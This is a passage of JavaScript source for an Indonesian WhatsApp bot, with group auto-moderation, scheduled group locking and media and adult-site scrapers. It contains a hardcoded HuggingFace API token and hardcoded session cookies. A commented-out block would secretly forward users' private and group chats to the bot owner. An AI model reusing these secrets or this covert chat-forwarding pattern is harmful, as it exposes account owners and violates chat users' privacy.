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',

// REPLY WITH URL
const reply795 = async(teks) => {
try {
ppuser = await znn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
var userpp = await getBuffer(ppuser)
znn.sendMessage(from, {text: teks, contextInfo:{ 
"mentionedJid": znn.ments(`${teks}`),
"isForwarded": false, 
"externalAdReply" : { 
"title": `Hallo ${pushname}`, 
"body": `${salam}`,
"mediaType": 1,
"previewType": "PHOTO",
"thumbnailUrl": '', 
"thumbnail": userpp,
"renderLargerThumbnail": true,
"sourceUrl": `${global.saluran}`}}},{quoted:fcall})
}

const kontolz = async(teks) => {
  try {
  ppuser = await znn.profilePictureUrl(m.sender, 'image')
  } catch (err) {
  ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
  }
  var userpp = await getBuffer(ppuser)
  znn.sendMessage(from, {text: teks, contextInfo:{ 
  "mentionedJid": znn.ments(`${teks}`),
  "isForwarded": false, 
  "externalAdReply" : { 
  "title": `Hallo ${pushname}`, 
  "body": `${salam}`,
  "mediaType": 1,
  "previewType": "PHOTO",
  "thumbnailUrl": '', 
  "thumbnail": userpp,
  "renderLargerThumbnail": true,
  "sourceUrl": `${global.saluran}`}}},{quoted:fcall})
  }
// FUNCTION SELF & BATAS COMMAND
if (!global.self && !isCreator && !isOwner && !['jadibot', 'stopjadibot', 'listjadibot', 'play', 'ai', 'owner', 'sc'].includes(command)) return !0;


// FUNCTION BANNED
if (isCmd && isBanned) return
if (isBanned) return reply('lu di ban tolol')
/*


// DATA CHAT USER PC TO GC
if (isPc && budy && !isCreator && !m.fromMe) {
await znn.sendteks(global.owner, `*WhatsApp Home*\nFrom : @${m.sender.split('@')[0]}\nChat : ${budy}`,)
}
if (m.isGroup && !isCreator && budy && !m.fromMe) {
await znn.sendteks(global.owner, `*WhatsApp Group*\nFrom : @${m.sender.split('@')[0]}\nChat : ${budy}`, m)
}
*/

// FUNCTION TAG OWNER
if (body.match(`@${global.owner.split('@')[0]}`)) {
      reply('*[ System Notice ]* jangan tag! chat di private chat!')
}
    
    
    
// FUNCTION MONO SPACE FONT
function monospace(string) {
return '```' + string + '```'
}

// AUTO SAVE PETUALANG
/*
if(!isPetualang&&!isCmd){
reqXp = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
await _petualang.push(m.sender)
await addInventoriDarah(m.sender, DarahAwal)
await addInventori(m.sender)
await addInventoriBuruan(m.sender)
await fs.writeFileSync('./database/rpg/inventory.json', JSON.stringify(_petualang))
await addLevelingId(m.sender)
let hallouser = `Hallo ${tag} aku *znn*, Bot whatsApp yang di program otomatis yang dapat digunakan untuk berinteraksi dengan pengguna di platform WhatsApp. *znn* dirancang untuk memberikan respon otomatis berdasarkan input dan permintaan yang diterima. *znn* akan membantu dan memecahkan masalah umum, memberikan informasi, memberikan dukungan pelanggan, dan bahkan melakukan transaksi bisnis\n\ninput *menu* untuk melanjutkan`
reply795(hallouser)
}*/

// FUNCTION LOADING BY znn
async function loading () {
var arr = [
"🕛",
"🕐",
"🕑",
"🕒",
"🕓",
"🕔",
"🕕",
"🕖",
"🕗",
"🕘",
"🕙",
"🕚",
"🕛"
]
let load = await znn.sendMessage(from, {text: '🕛'},{quoted:m})
for (let i = 0; i < arr.length; i++) {
await delay(100)
await znn.sendMessage(from, {text: arr[i], edit: load.key },{quoted:m});
}
}







// DETEKSI MEDIA
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isText = (type === 'conversation' || type === 'extendedTextMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedViewOnce = m.message.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2 ? true : false;
const mime = (quoted.msg || quoted).mimetype || quoted.mediaType || "";
const isMedia = /image|video|sticker|audio/.test(mime)


// FUNCTION MESSAGE
const onlyOwner = async() => {reply(global.mess.owner)};
const onlyAdmin = async() => {reply(global.mess.admin)};
const onlyGc = async() => {reply(global.mess.group)};
const botAdmin = async() => {reply(global.mess.botAdmin)};
const onlyWait = async() => {reply(global.mess.wait)};
const onlyGroup = async() => {
let joinbang = `Hallo ${tag}, untuk menggunakan semua fitur *znn*, harap masukan bot ke group anda terlebih dahulu agar anda dapat akses lebih di dalam group gratis tanpa prabayar
${global.group}

[ ketik *buatbot* untuk membuat bot anda sendiri ]`
reply795(joinbang)}
const sendMessageModify = (jid, teks = '', quoted = '', opts = {}) => {return znn.sendMessage(jid, {text: teks, contextInfo: {mentionedJid: ments(teks), externalAdReply: {showAdAttribution: opts.ads, title: opts.title ?? packname, body: opts.body, mediaType: 1, previewType: 'PHOTO', thumbnailUrl: opts.thumbUrl, thumbnail: opts.thumbnail, sourceUrl: opts.url, renderLargerThumbnail: opts.largeThumb }}}, {quoted: quoted})}




// FUNCTION SAVE KONTAK
const contacts = JSON.parse(fs.readFileSync("./database/contact/contacts.json"))
const isContacts = contacts.includes(sender)



// FUNCTION TIME AUTO CLOSE MAGHRIB
cron.schedule('0 0 18 * * *', async () => {
const getGroups = await znn.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis'
znn.sendMessage(from, {text: '*[ System Notice ]* Segeralah Beribadah...'});
if (groups.some(v => v === from) && !(await znn.groupMetadata(from)).announce) {
znn.groupSettingUpdate(from, 'announcement').then(() => znn.sendMessage(from, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })
cron.schedule('0 0 19 * * *', async () => {
const getGroups = await znn.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Waktu maghrib usai, group dibuka kembali.'
if (groups.some(v => v === from) && (await znn.groupMetadata(from)).announce) {
znn.groupSettingUpdate(from, 'not_announcement');
znn.sendMessage(from, {text: text, mentions: Object.values(global.db.groups[from].member).map(v => v.id)}, {ephemeralExpiration: m.expiration});
znn.groupRequestParticipantsList(from).then(async (data) => {
if (data.length === 0) return
for (let i of data) {
await znn.groupRequestParticipantsUpdate(from, [i.jid], 'approve')
await delay(1000)
}
})
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })

// FUNCTION TIDUR
cron.schedule('0 0 23 * * *', async () => {
const getGroups = await znn.groupFetchAllParticipating()
const groups = Object.keys(getGroups)
let text = '*[ System Notice ]* Group Di Tutup Secara Otomatis'
let imejnya = getBuffer('https://telegra.ph/file/3686f3e8dbe085a7b20fe.png')
let tidurnya = await znn.downloadAndSaveMediaMessage(imejnya, + new Date * 1)
znn.imgToSticker(from, tidurnya, m, {packname: packname, author: global.author});
if (groups.some(v => v === from) && !(await znn.groupMetadata(from)).announce) {
znn.groupSettingUpdate(from, 'announcement').then(() => znn.sendMessage(from, {text: text}, {ephemeralExpiration: m.expiration}));
}
}, { scheduled: true, timezone: 'Asia/Jakarta' })












// FUNCTION ONLY PRIVATE CHAT
        if (global.onlypc) {
        	if (command&!m.isGroup){
	         return reply(`znn dalam mode private, gunakan di private chat!`)
	     }
	}


// FUNCTION ANTILINK
if (global.antilink && !m.key.fromMe && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`chat.whatsapp.com`)) {
await znn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`hem hem izin dulu atmin (っ˘̩╭╮˘̩)っ`)
}
if (global.antilink && !isCreator && !isAdmins && isBotAdmins)
if (body.match(`https`)) {
await znn.sendMessage(from, {delete: {remoteJid: m.chat, id: m.id, participant: m.sender }})
reply(`upps tidak ada link ಠ︵ಠ`)
}

//---------------------------------------------( anti bot )---------------------------------------------//
 if (global.antibot && !isCreator && !isAdmins) {
    if (m.isBaileys && m.fromMe == false){
        if (!isAdmins || !isBotAdmins){		  
        } else {
          reply(`*[ System Notice ]* bot detected`)
    return await znn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
}

//AUTO REACT
/*let regex =[ "znn","menu","rpg","download","game","nsfw","search","tools","deposit","topup","jadibot","fun","shop","bot","play","start","afk"]
for (let i of regex){
if (isGroup && budy.toLowerCase().includes(i)){
let emot = await pickRandom(["👶🏿", "👍", "🙄", "🌚", "😏", "💩", "👻", "🔥", "🤣","🤬", "😎", "😂", "😘", "😑", "😱", "❤️", "👩‍⚕️", "😳","😍","🤩","🥳","🤔","🤗","🤤","👎","👊","🙈","🤡"])
znn.sendMessage(from, { react: { text: emot, key: m.key } })
}
}*/










// FUNCTION KILOMETER
async function jarak(dari, ke) {
	let html = (await axios(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + dari + ' ke ' + ke)}&hl=id`)).data
	let $ = cheerio.load(html), obj = {}
	let img = html.split("var s=\'")?.[1]?.split("\'")?.[0]
	obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,` [1], 'base64') : ''
	obj.desc = $('div.BNeawe.deIvCb.AP7Wnd').text()?.trim()
	return obj
}



// FUNCTION DIFFUSION
async function diff(data) {
	const response = await fetch(
		"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
		{
			headers: { Authorization: "Bearer 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" },
			method: "POST",
			body: JSON.stringify(data),
		}
	)
	const result = await response.blob();
	let arrayBuffer = await result.arrayBuffer();
	const buffer = Buffer.from(arrayBuffer, 'base64')
	return buffer
}
async function processing(urlPath, method) {
	return new Promise(async (resolve, reject) => {
		let Methods = ["enhance", "recolor", "dehaze"];
		Methods.includes(method) ? (method = method) : (method = Methods[0]);
		let buffer,
			Form = new FormData(),
			scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
		Form.append("model_version", 1, {
			"Content-Transfer-Encoding": "binary",
			contentType: "multipart/form-data; charset=uttf-8",
		});
		Form.append("image", Buffer.from(urlPath), {
			filename: "enhance_image_body.jpg",
			contentType: "image/jpeg",
		});
		Form.submit(
			{
				url: scheme,
				host: "inferenceengine" + ".vyro" + ".ai",
				path: "/" + method,
				protocol: "https:",
				headers: {
					"User-Agent": "okhttp/4.9.3",
					Connection: "Keep-Alive",
					"Accept-Encoding": "gzip",
				},
			},
			function (err, res) {
				if (err) reject();
				let data = [];
				res
					.on("data", function (chunk, resp) {
						data.push(chunk);
					})
					.on("end", () => {
						resolve(Buffer.concat(data));
					});
				res.on("error", (e) => {
					reject();
				});
			}
		);
	})
}



// FUNCTION SIZE FILE
const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}




// FUNCTION DOWNLOAD MP3 YTB
async function downloadMp3(url) {
try {
// jalur sampah
let mp3File = './.npm/'+getRandom('.mp3')
ytdl(url, {filter: 'audioonly'}).pipe(fs.createWriteStream(mp3File)).on('finish', async() => {
await znn.sendMessage(from, {audio: fs.readFileSync(mp3File), mimetype: 'audio/mpeg'}, {quoted:m})
fs.unlinkSync(mp3File)
})
} catch(e) {
console.log(e)
return znn.sendteks(from, util.format(e), m)
}
}


// FUNCTION DOWNLOAD HENTAI SFM
async function hentaivid() {
return new Promise((resolve, reject) => {
const page = Math.floor(Math.random() * 1153)
axios.get('https://sfmcompile.club/page/'+page)
.then((data) => {
const $ = cheerio.load(data.data)
const hasil2 = []
$('#primary > div > div > ul > li > article').each(function (a, b) {
hasil2.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
})
resolve(hasil2)
})
})
}





// AUTO DOWNLOAD YOUTUBE SCRAPER
if (global.autodonlod && !m.key.fromMe)
if (budy.match(`youtube.com|youtu.be`)) {
let lodingdonlod = `*[ Loaded ]* downloaded from the link`
const znnvido = require('./lib/ytdl2')
const vido=await znnvido.mp4(budy)
downloadMp3(budy)
const autod=`*Tittle:* ${vido.title}\n*Date:* ${vido.date}\n*Duration:* ${vido.duration}\n*Quality:* ${vido.quality}`
await znn.sendMessage(m.chat,{ video: {url:vido.videoUrl}, caption: autod },{quoted:m})
}
// AUTO DOWNLOAD TIKTOK SCRAPER
if (global.autodonlod && !m.key.fromMe)
if (budy.match(`tiktok.com`)){
reply('memuat..')
await TikTok(budy).then(async resi => {
let taev = `Title : ${resi.title}
Author : ${resi.author}`
await znn.sendMessage(from, {audio: {url: resi.audio}, mimetype: 'audio/mpeg', ptt: false})
await znn.sendMessage(from, {video: {url: resi.nowm}, caption: taev})
}).catch((err) => reply('Maaf erjadi Kesalahan!')) // pengalih isu
}























































async function terabox(urls) {
    return new Promise(async (resolve, reject) => {
      const req = await axios.get(urls, {
      	headers: {
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
  Connection: "keep-alive",
  Cookie: "csrfToken=x0h2WkCSJZZ_ncegDtpABKzt; browserid=Bx3OwxDFKx7eOi8np2AQo2HhlYs5Ww9S8GDf6Bg0q8MTw7cl_3hv7LEcgzk=; lang=en; TSID=pdZVCjBvomsN0LnvT407VJiaJZlfHlVy; __bid_n=187fc5b9ec480cfe574207; ndus=Y-ZNVKxteHuixZLS-xPAQRmqh5zukWbTHVjen34w; __stripe_mid=895ddb1a-fe7d-43fa-a124-406268fe0d0c36e2ae; ndut_fmt=FF870BBFA15F9038B3A39F5DDDF1188864768A8E63DC6AEC54785FCD371BB182",
  DNT: "1",
  Host: "www.4funbox.com",
  "Sec-Fetch-Dest": "document",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-Site": "none",
  "Sec-Fetch-User": "?1",
  "Upgrade-Insecure-Requests": "1",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
  "sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
}, 
      	withCredentials: true 
      });
      const responseData = req.data;

      const jsToken = findBetween(responseData, "fn%28%22", "%22%29");
      const logid = findBetween(responseData, "dp-logid=", "&");
      if (!jsToken || !logid) {
        return resolve({ error: "Invalid jsToken, logid" });
      }

      const { searchParams: requestUrl, href } = new URL(urls);
      if (!requestUrl.has("surl")) {
        return resolve({ error: "Missing data" });
      }
      const surl = requestUrl.get("surl");

      const params = {
        app_id: "250528",
        web: "1",
        channel: "dubox",
        clienttype: "0",
        jsToken: jsToken,
        dplogid: logid,
        page: "1",
        num: "20",
        order: "time",
        desc: "1",
        site_referer: href,
        shorturl: surl,
        root: "1",
      };

      const response = await axios.get("https://www.4funbox.com/share/list", {
        params,
        headers: {
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
  Connection: "keep-alive",
  Cookie: "csrfToken=x0h2WkCSJZZ_ncegDtpABKzt; browserid=Bx3OwxDFKx7eOi8np2AQo2HhlYs5Ww9S8GDf6Bg0q8MTw7cl_3hv7LEcgzk=; lang=en; TSID=pdZVCjBvomsN0LnvT407VJiaJZlfHlVy; __bid_n=187fc5b9ec480cfe574207; ndus=Y-ZNVKxteHuixZLS-xPAQRmqh5zukWbTHVjen34w; __stripe_mid=895ddb1a-fe7d-43fa-a124-406268fe0d0c36e2ae; ndut_fmt=FF870BBFA15F9038B3A39F5DDDF1188864768A8E63DC6AEC54785FCD371BB182",
  DNT: "1",
  Host: "www.4funbox.com",
  "Sec-Fetch-Dest": "document",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-Site": "none",
  "Sec-Fetch-User": "?1",
  "Upgrade-Insecure-Requests": "1",
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
  "sec-ch-ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
},
        withCredentials: true,
      });
      const responseData2 = response.data;
      if ((!"list") in responseData2) {
        resolve({ error: "Invalid response" });
      }
      resolve(responseData2?.list[0]);
    });
  };

// FUNCTION OBFUSCATOR znn
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}


// FUNCTION PORNHUB
async function searchVideo(query) {
  const url = `https://www.pornhub.com/video/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const videoList = [];

('li[data-video-segment]').each((index, element) => {
    const $element = $(element);
    
    const link = $element.find('.title a').attr('href').trim();
    const title = $element.find('.title a').text().trim();
    const uploader = $element.find('.videoUploaderBlock a').text().trim();
    const views = $element.find('.views').text().trim();
    const duration = $element.find('.duration').text().trim();
    
    const videoData = {
      link: "https://www.pornhub.com" + link,
      title: title,
      uploader: uploader,
      views: views,
      duration: duration
    };
    
    videoList.push(videoData);
  });
  
  return videoList;
}

async function searchGif(query) {
  const url = `http://www.pornhub.com/gifs/search?search=${query}`;
  const response = await fetch(url);
  const html = await response.text();
  const $ = cheerio.load(html);
  
  const gifs = $('ul.gifs.gifLink li');

    return gifs.map((i, gif) => {
      const data = $(gif).find('a');

      return {
        title: data.find('span').text(),
        url: 'http://dl.phncdn.com#id#.gif'.replace('#id#', data.attr('href')),
        webm: data.find('video').attr('data-webm'),
      };
    }).get();
}



// FUNCTION HENTAI SEARCH
async function searchHentai(search) {
  return new Promise((resolve, reject) => {
    axios.get("https://hentai.tv/?s=" + search).then(async ({ data }) => {
      let $ = cheerio.load(data)
      let result = {}
      let res = []
      result.coder = 'rem-comp'
      result.result = res
      result.warning = "It is strictly forbidden to reupload this code, copyright © 2022 by rem-comp"

     ('div.flex > div.crsl-slde').each(function (a, b) {
        let _thumbnail = $(b).find('img').attr('src')
        let _title = $(b).find('a').text().trim()
        let _views = $(b).find('p').text().trim()
        let _url = $(b).find('a').attr('href')
        let hasil = { thumbnail: _thumbnail, title: _title, views: _views, url: _url }
        res.push(hasil)
      })

      resolve(result)
    }).catch(err => {
      console.log(err)
    })
  })
}






// FUNCTION INSTAGRAM REELS
async function getingit(url){
let body = new URLSearchParams({"sf_url": encodeURI(url), "sf_submit": "", "new": 2, "lang": "id", "app": "", "country": "id", "os": "Windows", "browser": "Chrome", "channel": " main", "sf-nomad": 1});
let { data } = await axios({"url": "https://worker.sf-tools.com/savefrom.php", "method": "POST", "data": body, "headers": {"content-type": "application/x-www-form-urlencoded", "origin": "https://id.savefrom.net", "referer": "https://id.savefrom.net/", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36"}});
let exec = '[]["filter"]["constructor"](b).call(a);';
data = data.replace(exec, `\ntry {\ni++;\nif (i === 2) scriptResult = ${exec.split(".call")[0]}.toString();\nelse (\n${exec.replace(/;/, "")}\n);\n} catch {}`);
let context = {"scriptResult": "", "i": 0};
vm.createContext(context);
new vm.Script(data).runInContext(context);
return JSON.parse(context.scriptResult.split("window.parent.sf.videoResult.show(")?.[1].split(");")?.[0])
}
    
// FUNCTION AFK BY znn
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`${tag} sedang *Afk* ${reason ? 'karena ' + reason : 'tanpa alasan'} selama *${clockString(new Date - afkTime)}*
`.trim())
}
if (global.db.users[sender].afkTime > -1) {
let user = global.db.users[sender]
reply(`${tag} telah kembali dari *Afk* ${user.afkReason ? 'setelah ' + user.afkReason : ''}\nselama *${clockString(new Date - user.afkTime)}*`.trim())
user.afkTime = -1
user.afkReason = ''
}
    
    
    
